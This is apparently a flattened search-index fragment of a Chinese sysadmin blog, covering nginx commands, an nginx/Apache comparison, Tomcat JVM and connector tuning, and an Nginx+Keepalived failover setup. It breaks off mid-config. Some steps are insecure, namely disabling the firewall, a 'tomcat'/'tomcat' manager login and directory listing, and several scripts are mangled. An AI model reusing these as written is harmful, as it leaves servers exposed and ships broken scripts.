以特定目录下的配置文件启动nginx:nginx -s reload // 修改配置后重新加载生效nginx -s reopen // 重新打开日志文件nginx -s stop // 快速停止nginxnginx -s quit // 完整有序的停止nginxnginx -t // 测试当前配置文件是否正确nginx -t -c /path/to/nginx.conf //测试特定的nginx配置文件是否正确","link":"/2016/08/23/Web服务技术/Nginx/Nginx 的启动、停止、平滑重启、信号控制和平滑升级 /"},{"title":"Nginx-反向代理","text":"Nginx 和 apache 对比个人理解：存在就是理由,一般来说,需要性能的 web 服务,用 nginx 。如果不需要性能只求稳定, 那就 apache 吧。后者的各种功能模块实现得比前者,例如 ssl 的模块就比前者好,可配 置项多。 这里要注意一点,epoll(freebsd 上是 kqueue )网络 IO 模型是 nginx 处理性能 高的根本理由,但并不是所有的情况下都是 epoll 大获全胜的,如果本身提供静态服务的 就只有寥寥几个文件,apache 的 select 模型或许比 epoll 更高性能。当然,这只是根据 网络 IO 模型的原理作的一个假设,真正的应用还是需要实测了再说的。 2、作为 Web 服务器:相比 Apache,Nginx 使用更少的资源,支持更多的并发连接, 体现更高的效率,这点使 Nginx 尤其受到虚拟主机提供商的欢迎。在高连接并发的情况下, Nginx 是 Apache 服务器不错的替代品: Nginx 在美国是做虚拟主机生意的老板们经常选择 的软件平台之一. 能够支持高达 50,000 个并发连接数的响应, 感谢 Nginx 为我们选择了 epoll and kqueue 作为开发模型. Nginx 作为负载均衡服务器: Nginx既可以在内部直接支持 Rails和PHP 程序对外进行 服务, 也可以支持作为 HTTP 代理 服务器对外进行服务. Nginx 采用 C 进行编写, 不论是 系统资源开销还是 CPU 使用效率都比 Perlbal 要好很多. 作为邮件代理服务器: Nginx 同时也是一个非常优秀的邮件代理服务器(最早开发这个产品 的目的之一也是作为邮件代理服务器), Last.fm 描述了成功并且美妙的使用经验. Nginx 是一个安装非常的简单 , 配置文件非常简洁(还能够支持 perl 语法),Bugs非常少的服务器:Nginx启动特别容易, 并且几乎可以做到7*24不间断运行,即使运行数个月 也不需要重新启动. 你还能够不间断服务的情况下进行软件版本的升级 . Apache 与 Nginx 的优缺点比较 1、nginx 相对于 apache 的优点: 轻量级,同样起 web 服务,比 apache 占用更少的内存及资源抗并发,nginx 处理请求是异步非阻塞的,而 apache 则是阻塞型的,在高并发下 Nginx能保持低资源低消耗高性能 高度模块化的设计,编写模块相对简单 社区活跃,各种高性能模块出品迅速 2、 apache 相对于 nginx 的优点: rewrite ,比 nginx 的 rewrite 强大 模块超多,基本想到的都可以找到少 bug , nginx 的 bug 相对较多 (现在 bug 方面应该没多大区别) 超稳定 3、Nginx 配置简洁, Apache 复杂 Nginx 静态处理性能比 Apache 高 3 倍以上 Apache 对 PHP 支持比较简单,Nginx 需要配合其他后端用 Apache 的组件比 Nginx 多现在 Nginx 才是 Web 服务器的首选 4、最核心的区别在于 apache 是同步多进程模型,一个连接对应一个进程;nginx 是异步 的,多个连接(万级别)可以对应一个进程 5、nginx 处理静态文件好,耗费内存少.但无疑 apache 仍然是目前的主流,有很多丰富的特 性.所以还需要搭配着来.当然如果能确定 nginx 就适合需求,那么使用 nginx 会是更经济的方 式. 6、从个人过往的使用情况来看,nginx 的负载能力比 apache 高很多。最新的服务器也改 用 nginx 了。而且 nginx 改完配置能-t 测试一下配置有没有问题,apache 重启的时候发现 配置出错了,会很崩溃,改的时候都会非常小心翼翼现在看有好多集群站,前端 nginx 抗 并发,后端 apache 集群,配合的也不错。 7、nginx 处理动态请求是比较弱,一般动态请求要 apache 去做,nginx 只适合静态和反 向。8、nginx 是很不錯的前端服务器,负载性能很好, apache 对 php 等语言的支持很好,此外 apache 有强大的支持网路,发展时间相对 nginx 更久,bug 少但是 apache 有先天不 支持多核心处理负载的缺点,建议使用 nginx 做前端,后端用 apache。大型网站建议用 nginx 自代的集群功能.9、Nginx 优于 apache 的主要两点: 1.Nginx 本身就是一个反向代理服务器 2.Nginx 支持 7 层负载均衡;其他的当然,Nginx 可能会比 apache 支持更高的并发。 10、你对 web server 的需求决定你的选择。大部分情况下 nginx 都优于 APACHE,比如 说静态文件处理、PHP-CGI 的支持、反向代理功能、前端 Cache、维持连接等等。在 Apache+PHP(prefork)模式下,如果 PHP 处理慢或者前端压力很大的情况下,很容易 出现 Apache 进程数飙升,从而拒绝服务的现象。 11、可以看一下 nginx lua 模块:https://github.com/ chaoslaw…apache 比 nginx 多的 模块,可直接用 lua 实现 apache 是最流行的,why?大多数人懒得更新到 nginx 或者学新事物 12、对于 nginx,我喜欢它配置文件写的很简洁,正则配置让很多事情变得简单运行效率 高,占用资源少,代理功能强大,很适合做前端响应服务器 13、Apache 在处理动态有优势,Nginx 并发性比较好,CPU 内存占用低,如果 rewrite 频繁,那还是Apache吧","link":"/2016/03/26/Web服务技术/Nginx/ Nginx 和 apache 对比 /"},{"title":"记一次线上tomcat内存不足配置并发优化过程","text":"前言：tomcat的内存使用配置,最大连接数配置。如何修改配置呢，在/tomcat的/bin/下面有个这个脚本文件。catailna.sh 脚本文件。 如果windows 是bat设置tomcat的使用内存，也其实就是设置jim的使用参数。 设置Tomcat启动的初始内存其初始空间(即-Xms)是物理内存的1/64，最大空间(-Xmx)是物理内存的1/4。可以利用JVM提供的-Xmn -Xms -Xmx等选项可 要加“m”说明是MB，否则就是KB了，在启动tomcat时会 报内存不足。 123-Xms：初始值 【初始化内存大小】-Xmx：最大值 【可以使用的最大内存】-Xmn：最小值 JVM堆的设置是指java程序运行过程中JVM可以调配使用的内存空间的设置.JVM在启动的时候会自动设置Heap size的值，其初始空间(即-Xms)是物理内存的1/64，最大空间(-Xmx)是物理内存的1/4。可以利用JVM提供的-Xmn -Xms -Xmx等选项可进行设置。Heap size 的大小是Young Generation 和Tenured Generaion 之和。 提示：在JVM中如果98％的时间是用于GC且可用的Heap size 不足2％的时候将抛出此异常信息. 提示：Heap Size 最大不要超过可用物理内存的80％，一般的要将-Xms和-Xmx选项设置为相同，而-Xmn为1/4的-Xmx值。 这两个值的大小一般根据需要进行设置。初始化堆的大小执行了虚拟机在启动时向系统申请的内存的大小。一般而言，这个参数不重要。但是有的应用 程序在大负载的情况下会急剧地占用更多的内存，此时这个参数就是显得非常重要，如果虚拟机启动时设置使用的内存比较小而在这种情况下有许多对象进行初始 化，虚拟机就必须重复地增加内存来满足使用。由于这种原因，我们一般把-Xms和-Xmx设为一样大，而堆的最大值受限于系统使用的物理内存。一般使用数 据量较大的应用程序会使用持久对象，内存使用有可能迅速地增长。当应用程序需要的内存超出堆的最大值时虚拟机就会提示内存溢出，并且导致应用服务崩溃。因 此一般建议堆的最大值设置为可用内存的最大值的80%。 如果系统花费很多的时间收集垃圾，请减小堆大小。一次完全的垃圾收集应该不超过 3-5 秒。如果垃圾收集成为瓶颈，那么需要指定代的大小，检查垃圾收集的详细输出，研究 垃圾收集参数对性能的影响。一般说来，你应该使用物理内存的 80% 作为堆大小。当增加处理器时，记得增加内存，因为分配可以并行进行，而垃圾收集不是并行的。在重启你的Tomcat服务器之后，这些配置的更改才会有效。 1Windows下，在文件&#123;tomcat_home&#125;/bin/catalina.bat，Unix下，在文件&#123;tomcat_home&#125;/bin/catalina.sh的前面，增加如下设置： Tomcat内存优化Tomcat内存优化主要是对 tomcat 启动参数优化，我们可以在 tomcat 的启动脚本 catalina.sh 中设置JAVA_OPTS 参数。 1234567891.JAVA_OPTS参数说明Java代码 -server 启用jdk 的 server 版； -Xms java虚拟机初始化时的最小内存； -Xmx java虚拟机可使用的最大内存； -XX:PermSize 内存永久保留区域 -XX:MaxPermSize 内存最大永久保留区域 服务器参数配置12345678 tomcat默认： -Xms1024m -Xmx1024m -Xss1024K -XX:PermSize=128m -XX:MaxPermSize=256mJava代码 JAVA_OPTS=\"-Djava.awt.headless=true -Dfile.encoding=UTF-8 -server -Xms2048m -Xmx2048m -XX:NewSize=512m -XX:MaxNewSize=512m -XX:PermSize=512m -XX:MaxPermSize=512m -XX:+DisableExplicitGC\" 配置完成后可重启Tomcat ，通过以下命令进行查看配置是否生效： 首先查看Tomcat进程号：1ps -ef | grep tomcat 我们可以看到Tomcat 进程号是 32179 。 实践例子： 先查看没有优化tomcat内存前： 1sudo jmap – heap 32179 查看是否配置生效：123Xml代码sudo jmap – heap 32179 我们可以看到MaxHeapSize 等参数已经生效。 提示：如果jdk1.8 启动服务会有警告⚠️ Java HotSpot(TM) 64-Bit Server VM warning: ignoring option PermSize=512m; support was removed in 8.0 Tomcat并发优化1.Tomcat连接相关参数 在Tomcat 配置文件conf下面 server.xml 中的 配置中 在tomcat配置文件server.xml中的配置中，和连接数相关的参数有： minProcessors：最小空闲连接线程数，用于提高系统处理性能，默认值为10maxProcessors：最大连接线程数，即：并发处理的最大请求数，默认值为75acceptCount：允许的最大连接数，应大于等于maxProcessors，默认值为100enableLookups：是否反查域名，取值为：true或false。为了提高处理能力，应设置为falseconnectionTimeout：网络连接超时，单位：毫秒。设置为0表示永不超时，这样设置有隐患的。通常可设置为30000毫秒。 参数说明12345678910111213141516171819202122232425262728默认的tomcat 参数： &lt;Connector port=“8080\" protocol=\"HTTP/1.1\" connectionTimeout=\"20000\" redirectPort=\"8443\" /&gt;修改： &lt;Connector port=“8080\" protocol=\"HTTP/1.1\" maxThreads=\"600\" minSpareThreads=\"100\" maxSpareThreads=\"500\" acceptCount=\"700\" connectionTimeout=\"20000\" redirectPort=\"8443\" /&gt;``` 这样设置以后，基本上没有再当机过。``` bash maxThreads=“600\" 表示最多同时处理600个连接 ///最大线程数 minSpareThreads=“100\" 表示即使没有人使用也开这么多空线程等待 ///初始化时创建的线程数 maxSpareThreads=“500\" 表示如果最多可以空500个线程，例如某时刻有505人访问，之后没有人访问了，则tomcat不会保留505个空线程，而是关闭505个空的。 ///一旦创建的线程超过这个值，Tomcat就会关闭不再需要的socket线程。 acceptCount=\"700\"//指定当所有可以使用的处理请求的线程数都被使用时，可以放到处理队列中的请求数，超过这个数的请求将不予处理这里是http connector的优化，如果使用apache和tomcat做集群的负载均衡，并且使用ajp协议做apache和tomcat的协议转发，那么还需要优化ajp connector。 &lt;Connector port=\"8009\" protocol=\"AJP/1.3\" maxThreads=\"600\" minSpareThreads=\"100\" maxSpareThreads=\"500\" acceptCount=\"700\"connectionTimeout=\"20000\" redirectPort=\"8443\" /&gt; 报错errorTomcat的JVM提示内存溢出1查看%TOMCAT_HOME%\\logs文件夹下，日志文件是否有内存溢出错误 修改Tomcat的JVM11、错误提示：java.lang.OutOfMemoryError: Java heap space Tomcat默认可以使用的内存为128MB，在较大型的应用项目中，这点内存是不够的，有可能导致系统无法运行。常见的问题是报Tomcat内存溢出错误，Out of Memory(系统内存不足)的异常，从而导致客户端显示500错误，一般调整Tomcat的使用内存即可解决此问题。 12windows环境下修改 “%TOMCAT_HOME%\\bin\\catalina.bat”文件，在文件开头增加如下设置：JAVA_OPTS=-Xms2048m -Xmx2048m Linux环境下修改12 “%TOMCAT_HOME%\\bin\\catalina.sh”文件，在文件开头增加如下设置：JAVA_OPTS=-Xms2048m -Xmx2048m其中，-Xms设置初始化内存大小，-Xmx设置可以使用的最大内存。 跟我上面那么设置就可以了。 2.错误提示：java.lang.OutOfMemoryError: PermGen space 原因： 12 PermGen space的全称是Permanent Generation space,是指内存的永久保存区域，这块内存主要是被JVM存放Class和Meta信息的,Class在被Loader时就会被放到PermGen space中，它和存放类实例(Instance)的Heap区域不同,GC(Garbage Collection)不会在主程序运行期对PermGen space进行清理，所以如果你的应用中有很CLASS的话,就很可能出现PermGen space错误，这种错误常见在web服务器对JSP进行pre compile的时候。如果你的WEB APP下都用了大量的第三方jar, 其大小超过了jvm默认的大小(4M)那么就会产生此错误信息了。 解决方法： 123456在catalina.bat的第一行增加： set JAVA_OPTS=-Xms64m -Xmx256m -XX:PermSize=128M -XX:MaxNewSize=256m - XX:MaxPermSize=256m在catalina.sh的第一行增加： JAVA_OPTS=-Xms64m -Xmx256m -XX:PermSize=128M -XX:MaxNewSize=256m XX:MaxPermSize=256m 查看Tomcat的JVM内存12345678910111. Tomcat6中没有设置任何默认用户，因而需要手动往Tomcat6的conf文件夹下的tomcat-users.xml文件中添加用户。如： &lt;role rolename=\"manager\"/&gt; &lt;user username=\"tomcat\" password=\"tomcat\" roles=\"manager\"/&gt; 注：添加完需要重启Tomcat6。2. 访问http://localhost:8080/manager/status，输入上面添加的用户名和密码。3. 然后在如下面的JVM下可以看到内存的使用情况。 学习Tomcat给自己总结。","link":"/2016/06/21/Web服务技术/tomcat/记一次线上tomcat内存不足配置并发优化过程/"},{"title":"Nginx+Keepalived实现高可用Web负载均衡","text":"Nginx+Keepalived实现高可用Web负载均衡一、需求场景：通过之前的一篇文章： Nginx+Tomcat实现负载均衡,我们已经能通过Nginx来实现Tomcat应用的负载均衡，但是单个的Nginx会存在单点隐患，如果Nginx挂掉，那么全部的Tomcat应用都将变得不可用，所以实现Nginx的高可用是必不可少的一步。 二、说明 高可用 HA（High Availability），简单讲就是：我某个应用挂了，自动有另外应用起来接着扛着，致使整个服务对外来看是没有中断过的。这里的重点就是不中断，致使公司整个业务能不断进行中，把影响减到最小，赚得更多。 因为要不中断，所以我们就需要用到了 Keepalived。Keepalived 一般不会单独使用，基本都是跟负载均衡软件（LVS、HAProxy、Nginx）一起工作来达到集群的高可用效果。 Keepalived 有双主、主备方案 常用词： 心跳：Master 会主动给 Backup 发送心跳检测包以及对外的网络功能，而 Backup 负责接收 Master 的心跳检测包，随时准备接管主机。为什么叫心跳不知道，但是挺形象的，心跳同步。 选举：Keepalived 配置的时候可以指定各台主机优先级，Master 挂了，各台 Backup 要选举出一个新的 Master。 Keepalived 官网：http://www.keepalived.org/ 官网下载：http://www.keepalived.org/download.html 官网文档：http://www.keepalived.org/documentation.html 三、搭建 软件版本： Nginx：1.8.1 Keepalived：1.2.20 JDK：8u72 Tomcat：8.0.32 部署环境（下文中以第几台来代表这些主机）： 虚拟 IP（VIP）：192.168.1.50 第一台主机：Nginx 1 + Keepalived 1 == 192.168.1.120（Master） 第二台主机：Nginx 2 + Keepalived 2 == 192.168.1.121（Backup) 第三台主机：Tomcat 1 == 192.168.1.122（Web 1） 第四台主机：Tomcat 2 == 192.168.1.123（Web 2） 所有机子进行时间校准：NTP（Network Time Protocol）介绍 第三、第四台主机部署： JDK 的安装：JDK 安装 Tomcat 的安装：Tomcat 安装和配置、优化 第一、二台主机部署（两台部署内容一样）： Nginx 的安装：Nginx 安装和配置 四、Keepalived安装123456789101112131415161718192021222324安装依赖：# sudo yum install -y gcc openssl-devel popt-devel上传或下载 keepalived &amp; 解压包：cd /opt/setups/; # tar zxvf keepalived-1.2.20.tar.gz编译：# cd /opt/setups/keepalived-1.2.20 ; # ./configure --prefix=/usr/local/keepalived编译安装：# make &amp;&amp; make installKeepalived 设置服务和随机启动复制配置文件到启动脚本目录：# cp /usr/program/keepalived/etc/rc.d/init.d/keepalived /etc/init.d/keepalived# cp /usr/local/keepalived/etc/sysconfig/keepalived /etc/sysconfig/# ln -s /usr/local/sbin/keepalived /usr/sbin/# ln -s /usr/local/keepalived/sbin/keepalived /sbin/设置keepalived服务开机启动： # chkconfig keepalived on增加权限# chmod +x /etc/init.d/keepalived Keepalived 配置123456添加环境变量：vim /etc/profileKEEPALIVED_HOME=/usr/local/keepalivedPATH=$PATH:$KEEPALIVED_HOME/sbinexport KEEPALIVED_HOMEexport PATH 刷新环境变量：source /etc/profile 检测环境变量：keepalived -v 123vim /usr/local/keepalived/etc/sysconfig/keepalived把 14 行的：KEEPALIVED_OPTIONS=\"-D\"，改为：KEEPALIVED_OPTIONS=\"-D -f /usr/local/keepalived/etc/keepalived/keepalived.conf\" 第一、二台主机配置（两台在 Keepalived 配置上稍微有不一样）： 123456789健康监测脚本（我个人放在：/opt/bash 目录下）：[nginx_check.sh](Keepalived-Settings/nginx_check.sh)健康监测脚本添加执行权限：chmod 755 /opt/bash/nginx_check.sh运行监测脚本，看下是否有问题：sh /opt/bash/nginx_check.sh，如果没有报错，则表示改脚本没有问题.这个脚本很重要，如果脚本没法用，在启用 Keepalived 的时候可能会报：Keepalived_vrrp[5684]: pid 5959 exited with status 1 nginx 配置（两台一样配置）： 123456789101112131415161718192021222324252627282930worker_processes 1; events &#123; worker_connections 1024; &#125; http &#123; include mime.types; default_type application/octet-stream; sendfile on; keepalive_timeout 65; # （重点） upstream tomcatCluster &#123; server 192.168.1.122:8080 weight=1; server 192.168.1.123:8080 weight=1; &#125; # （重点） server &#123; listen 80; server_name 192.168.1.50; location / &#123; proxy_pass http://tomcatCluster; index index.html index.htm; &#125; &#125; &#125; 4.1 修改keepalived配置文件cat /etc/init.d/keepalived 1234567891011121314151617181920212223242526272829! Configuration File for keepalivedglobal_defs &#123;keepalived 自带的邮件提醒需要开启 sendmail 服务。建议用独立的监控或第三方 SMTProuter_id edu-proxy-01 ## 标识本节点的字条串,通常为 hostname &#125;keepalived 会定时执行脚本并对脚本执行的结果进行分析,动态调整 vrrp_instance 的优先级。如果 脚本执行结果为 0,并且 weight 配置的值大于 0,则优先级相应的增加。如果脚本执行结果非 0,并且 weight 配置的值小于 0,则优先级相应的减少。其他情况,维持原本配置的优先级,即配置文件中 priority 对应 的值。vrrp_script chk_nginx &#123;script \"/etc/keepalived/nginx_check.sh\" interval 2 ## 检测时间间隔weight -20 ## 如果条件成立,权重-20&#125;检测 nginx 状态的脚本路径定义虚拟路由,VI_1 为虚拟路由的标示符,自己定义名称vrrp_instance VI_1 &#123;state MASTER ## 主节点为 MASTER,对应的备份节点为 BACKUPinterface eth1 ## 绑定虚拟 IP 的网络接口,与本机 IP 地址所在的网络接口相同,我的是 eth1 virtual_router_id 51 ## 虚拟路由的 ID 号,两个节点设置必须一样,可选 IP 最后一段使用, 相同的 VRID 为一个组,他将决定多播的 MAC 地址，eth1值的获取可以在机器上执行ifconfig命令得到mcast_src_ip 192.168.1.51## 本机 IP 地址priority 100 ## 节点优先级,值范围 0-254,MASTER 要比 BACKUP 高 nopreempt ## 优先级高的设置 nopreempt 解决异常恢复后再次抢占的问题 advert_int 1 ## 组播信息发送间隔,两个节点设置必须一样,默认 1s ## 设置验证信息,两个节点必须一致authentication &#123; auth_type PASSauth_pass 1111 ## 真实生产,按需求对应该过来 &#125;将 track_script 块加入 instance 配置块.track_script &#123;chk_nginx ## 执行 Nginx 监控的服务&#125;虚拟 IP 池, 两个节点设置必须一样virtual_ipaddress &#123;192.168.1.50 ## 虚拟 ip,可以定义多个&#125; &#125; Keepalived 配置文件编辑（第一、二台配置稍微不同，不同点具体看下面重点说明） 编辑：vim /usr/local/keepalived/etc/keepalived/keepalived.conf 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556! Configuration File for keepalived # 全局配置 global_defs &#123; # 邮箱通知配置，keepalived 在发生切换时需要发送 email 到的对象，一行一个 notification_email &#123; #acassen@firewall.loc #failover@firewall.loc #sysadmin@firewall.loc &#125; # 指定发件人 #notification_email_from Alexandre.Cassen@firewall.loc # 指定smtp服务器地址 #smtp_server 192.168.200.1 # 指定smtp连接超时时间，单位秒 #smtp_connect_timeout 30 router_id LVS_DEVEL vrrp_skip_check_adv_addr vrrp_strict&#125; # （重点）脚本监控实现 vrrp_script check_nginx &#123; # 运行脚本 script \"/opt/bash/nginx_check.sh\" # 时间间隔，2秒 interval 2 # 权重 weight 2 &#125; vrrp_instance VI_1 &#123; # （重点）Backup 机子这里是设置为：BACKUP state MASTER interface eth0 virtual_router_id 51 # （重点）Backup 机子要小于当前 Master 设置的 100，建议设置为 99 priority 100 # Master 与 Backup 负载均衡器之间同步检查的时间间隔，单位是秒 advert_int 1 authentication &#123; auth_type PASS auth_pass 1111 &#125; # （重点）配置虚拟 IP 地址，如果有多个则一行一个 virtual_ipaddress &#123; 192.168.1.50 &#125; # （重点）脚本监控调用 track_script &#123; check_nginx &#125; &#125; 附录：192.168.31.146（MASTER节点）的keepalived.conf 12345678910111213141516171819202122232425262728! Configuration File for keepalivedglobal_defs &#123; router_id dreyer-zk-03&#125;vrrp_script chk_nginx &#123; script \"/etc/keepalived/nginx_check.sh\" interval 2 weight -20&#125;vrrp_instance VI_1 &#123; state MASTER interface eth0 virtual_router_id 146 mcast_src_ip 192.168.1.120 priority 100 nopreempt advert_int 1 authentication &#123; auth_type PASS auth_pass 1111 &#125; track_script &#123; chk_nginx &#125; virtual_ipaddress &#123; 192.168.31.111 &#125;&#125; 192.168.31.154（BACKUP节点）的keepalived.conf 123456789101112131415161718192021222324252627! Configuration File for keepalivedglobal_defs &#123; router_id dreyer-zk-01&#125;vrrp_script chk_nginx &#123; script \"/etc/keepalived/nginx_check.sh\" interval 2 weight -20&#125;vrrp_instance VI_1 &#123; state BACKUP interface eth0 virtual_router_id 146 mcast_src_ip 192.168.1.121 priority 90 advert_int 1 authentication &#123; auth_type PASS auth_pass 1111 &#125; track_script &#123; chk_nginx &#125; virtual_ipaddress &#123; 192.168.31.111 &#125;&#125; nginx_check.sh（Nginx状态检测脚本）12345678#!/bin/bashA=ps -C nginx –no-header |wc -lif [ $A -eq 0 ];then /usr/local/nginx/sbin/nginx sleep 2 if [ps -C nginx --no-header |wc -l-eq 0 ];then killall keepalived fifi 脚本大意为：检查是否有nginx进程，如果没有，那么就启动nginx，启动后睡眠2秒，再检查是否有nginx的进程，如果没有的话，那么就杀掉keepalived的全部进程（杀掉进程后keepalived才能进行重新选举） 启动各自服务1234567891011121314151617四台机子都停掉防火墙：service iptables stop先启动两台 Tomcat：sh /usr/program/tomcat8/bin/startup.sh tail -200f /usr/program/tomcat8/logs/catalina.out检查两台 Tomcat 是否可以单独访问，最好给首页加上不同标识，好方便等下确认是否有负载. http://192.168.1.122:8080 http://192.168.1.123:8080启动两台 Nginx 服务：/usr/local/nginx/sbin/nginx 启动两台 Keepalived 服务：service keepalived start查看 Master 和 Backup 两台主机的对应日志：tail -f /var/log/messages 高可用测试模拟 Keepalived 挂掉关闭Master主机的Keepalived，查看 Master 和 Backup两台主机的对应日志： 1tail -f /var/log/messages 关闭服务： 1service keepalived stop 如果第二台机接管了，则表示成功重新开启 Master 主机的 Keepalived，查看 Master 和 Backup 两台主机的对应日志： 1tail -f /var/log/messages 重启服务：service keepalived restart 如果第一台机重新接管了，则表示成功 模拟 Nginx 挂掉 关闭 Master 主机的 Nginx，查看 Master 和 Backup 两台主机的对应日志： 1tail -f /var/log/messages 关闭服务：/usr/local/nginx/sbin/nginx -s stop如果第二台机接管了，则表示成功重新开启 Master 主机的 Nginx，查看 Master 和 Backup 两台主机的对应日志： 1tail -f /var/log/messages 重启 Nginx 服务：/usr/local/nginx/sbin/nginx -s reload 重启 Keepalived 服务：service keepalived restart 如果第一台机重新接管了，则表示成功 可以优化的地方，改为双主热备，监控脚本上带有自启动相关细节，后续再进行。 日志中常用的几句话解释： 12345- `Entering to MASTER STATE`，变成 Master 状态 - `Netlink reflector reports IP 192.168.1.50 added`，一般变为 Master 状态，都要重新加入虚拟 IP，一般叫法叫做：虚拟 IP 重新漂移到 Master 机子上- `Entering BACKUP STATE`，变成 Backup 状态 - `Netlink reflector reports IP 192.168.1.50 removed`，一般变为 Backup 状态，都要移出虚拟 IP，一般叫法叫做：虚拟 IP 重新漂移到 Master 机子上- `VRRP_Script(check_nginx) succeeded`，监控脚本执行成功 资料 http://xutaibao.blog.51cto.com/7482722/1669123 https://m.oschina.net/blog/301710 http://blog.csdn.net/u010028869/article/details/50612571 http://blog.csdn.net/wanglei_storage/article/details/51175418","link":"/2016/05/22/Web服务技术/Nginx/Nginx+Keepalived实现高可用Web负载均衡 /"},{"title":"Nginx基础篇-Nginx.conf配置文件详解","text":"Nginx.conf配置文件详解Nginx配置文件主要分成四部分：main（全局设置）、server（主机设置）、upstream（上游服务器设置，主要为反向代理、负载均衡相关配置）和 location（URL匹配特定位置后的设置），每部分包含若干个指令。main部分设置的指令将影响其它所有部分的设置；server部分的指令主要用于指定虚拟主机域名、IP和端口；upstream的指令用于设置一系列的后端服务器，设置反向代理及后端服务器的负载均衡；location部分用于匹配网页位置（比如，根目录“/”,“/images”,等等）。他们之间的关系式：server继承main，location继承server；upstream既不会继承指令也不会被继承。它有自己的特殊指令，不需要在其他地方的应用。 当前nginx支持的几个指令上下文： 2.1 通用下面的nginx.conf简单的实现nginx在前端做反向代理服务器的例子，处理js、png等静态文件，jsp等动态请求转发到其它服务器tomcat： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159#定义Nginx运行的用户和用户user www www;#nginx进程数，建议设置为等于CPU总核心数。这里我服务器4核worker_processes 4;#一个1核CPU对应一个进程数管理。这样能很好分配资源。worker_cpu_affinity 00000001 00000010 00000100 00001000; #全局错误日志定义类型，[ debug | info | notice | warn | error | crit ]error_log /var/log/nginx/error.log info;#进程文件pid /var/run/nginx.pid;#一个nginx进程打开的最多文件描述符数目，理论值应该是最多打开文件数（系统的值ulimit -n）与nginx进程数相除，但是nginx分配请求并不均匀，所以建议与ulimit -n的值保持一致。worker_rlimit_nofile 65535;#工作模式与连接数上限events&#123;#参考事件模型，use [ kqueue | rtsig | epoll | /dev/poll | select | poll ]; epoll模型是Linux 2.6以上版本内核中的高性能网络I/O模型，如果跑在FreeBSD上面，就用kqueue模型。use epoll;#单个进程最大连接数（最大连接数=连接数*进程数）worker_connections 65535;&#125;#设定http服务器http&#123;include mime.types; #文件扩展名与文件类型映射表default_type application/octet-stream; #默认文件类型include /usr/local/nginx/conf/proxy.conf; #charset utf-8; #默认编码# log_format main '$remote_addr - $remote_user [$time_local] \"$request\" '# '$status $body_bytes_sent \"$http_referer\" '# '\"$http_user_agent\" \"$http_x_forwarded_for\"';# 默认的nginx日志格式 server_names_hash_bucket_size 128; #服务器名字的hash表大小client_header_buffer_size 32k; #上传文件大小限制large_client_header_buffers 4 64k; #设定请求缓client_max_body_size 8m; #设定请求缓sendfile on; #开启高效文件传输模式，sendfile指令指定nginx是否调用sendfile函数来输出文件，对于普通应用设为 on，如果用来进行下载等应用磁盘IO重负载应用，可设置为off，以平衡磁盘与网络I/O处理速度，降低系统的负载。注意：如果图片显示不正常把这个改成off。autoindex on; #开启目录列表访问，合适下载服务器，默认关闭。tcp_nopush on; #防止网络阻塞tcp_nodelay on; #防止网络阻塞keepalive_timeout 120; #长连接超时时间，单位是秒#keepalive 超时时间，客户端到服务端的连接持续有效时间当出现对服务器后，继续请求时keepalive_timeout功能可避免建立或者重新。#FastCGI相关参数是为了改善网站的性能：减少资源占用，提高访问速度。下面参数看字面意思都能理解。fastcgi_connect_timeout 300;fastcgi_send_timeout 300;fastcgi_read_timeout 300;fastcgi_buffer_size 64k;fastcgi_buffers 4 64k;fastcgi_busy_buffers_size 128k;fastcgi_temp_file_write_size 128k;#gzip模块设置gzip on; #开启gzip压缩输出gzip_min_length 1k; #最小压缩文件大小gzip_buffers 4 16k; #压缩缓冲区gzip_http_version 1.0; #压缩版本（默认1.1，前端如果是squid2.5请使用1.0）gzip_comp_level 2; #压缩等级gzip_types text/plain application/x-javascript text/css application/xml;#压缩类型，默认就已经包含text/html，所以下面就不用再写了，写上去也不会有问题，但是会有一个warn。gzip_vary on;#limit_zone crawler $binary_remote_addr 10m; #开启限制IP连接数的时候需要使用upstream blog.yangcvo.com &#123;#upstream的负载均衡，weight是权重，可以根据机器配置定义权重。weigth参数表示权值，权值越高被分配到的几率越大。server 192.168.80.121:80 weight=3 max_fails=2 fail_timeout=30s;server 192.168.80.122:80 weight=2 max_fails=2 fail_timeout=30s;server 192.168.80.123:80 weight=3 max_fails=2 fail_timeout=30s;&#125;#虚拟主机的配置server&#123;#监听端口listen 80;#域名可以有多个，用空格隔开server_name www.yangcvo.com ; ##(服务器名)index index.html index.htm index.php;root /data/www/ha97; location ~ .*\\.(php|php5)?$&#123;fastcgi_pass 127.0.0.1:9000;fastcgi_index index.php;include fastcgi.conf;&#125;#图片缓存时间设置location ~ .*\\.(gif|jpg|jpeg|png|bmp|swf)$&#123;expires 10d;&#125;#JS和CSS缓存时间设置location ~ .*\\.(js|css)?$&#123;expires 1h;&#125;#日志格式设定log_format access '$remote_addr - $remote_user [$time_local] \"$request\" ''$status $body_bytes_sent \"$http_referer\" ''\"$http_user_agent\" $http_x_forwarded_for';#定义本虚拟主机的访问日志access_log /var/log/nginx/access.log access;#对 \"/\" 启用反向代理location / &#123;proxy_pass http://127.0.0.1:88;proxy_redirect off;proxy_set_header X-Real-IP $remote_addr;#后端的Web服务器可以通过X-Forwarded-For获取用户真实IPproxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;#以下是一些反向代理的配置，可选。proxy_set_header Host $host;client_max_body_size 10m; #允许客户端请求的最大单文件字节数client_body_buffer_size 128k; #缓冲区代理缓冲用户端请求的最大字节数，proxy_connect_timeout 90; #nginx跟后端服务器连接超时时间(代理连接超时)proxy_send_timeout 90; #后端服务器数据回传时间(代理发送超时)proxy_read_timeout 90; #连接成功后，后端服务器响应时间(代理接收超时)proxy_buffer_size 4k; #设置代理服务器（nginx）保存用户头信息的缓冲区大小proxy_buffers 4 32k; #proxy_buffers缓冲区，网页平均在32k以下的设置proxy_busy_buffers_size 64k; #高负荷下缓冲大小（proxy_buffers*2）proxy_temp_file_write_size 64k;#设定缓存文件夹大小，大于这个值，将从upstream服务器传&#125;#设定查看Nginx状态的地址location /NginxStatus &#123;stub_status on;access_log on;auth_basic \"NginxStatus\";auth_basic_user_file conf/htpasswd;#htpasswd文件的内容可以用apache提供的htpasswd工具来产生。&#125;#本地动静分离反向代理配置#所有jsp的页面均交由tomcat或resin处理location ~ .(jsp|jspx|do)?$ &#123;proxy_set_header Host 